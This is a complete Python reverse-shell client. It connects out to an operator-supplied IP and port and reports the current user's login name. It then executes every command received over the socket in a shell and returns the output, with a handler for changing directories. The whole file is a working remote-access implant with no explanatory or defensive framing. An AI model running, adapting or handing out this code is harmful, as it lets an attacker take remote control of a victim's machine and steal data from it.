import socket
import time
import subprocess
import os
import sys


def inbound_message():
    print('[+] Listening for incoming messages...')
    while True:
        # message = ''
        try:
            message = sock.recv(1024).decode()
            return message
        except KeyboardInterrupt:
            sock.close()
            print('[+] Keyboard interrupt issued')
            break
        except Exception as e:
            print(e)
            sock.close()
            break


def outbound_message(message):
    response = str(message).encode()
    sock.send(response)
    print('[+] Reply sent...')


def session_handler():
    print(f'[+] Connecting to {host_ip}')
    sock.connect((host_ip, host_port))
    outbound_message(os.getlogin())
    print(f'[+] Connected to {host_ip}')
    while True:
        message = inbound_message()
        print(f'[+] Message received - {message}')
        if message == 'exit':
            print('[-] The server has terminated the session.')
            sock.close()
            break
        elif not message:
            sock.close()
            break
        # Change directory script
        elif message.split(" ")[0] == 'cd':
            try:
                directory = str(message.split(" ")[1])
                os.chdir(directory)
                cur_dir = os.getcwd()
                print(f'[+] Changed to {cur_dir}')
                outbound_message(cur_dir)
            except FileNotFoundError:
                outbound_message('Invalid directory. Try again.')
                continue
            except IndexError:
                outbound_message('Argument missing. Try again.')

        # Subprocess command handling
        else:
            command = subprocess.Popen(
                message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output = command.stdout.read() + command.stderr.read()
            outbound_message(output.decode())


if __name__ == '__main__':
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        host_ip = sys.argv[1]
        host_port = int(sys.argv[2])
        session_handler()
    except IndexError:
        print('[-] Argumet(s) missing.')
    except Exception as e:
        print(e)
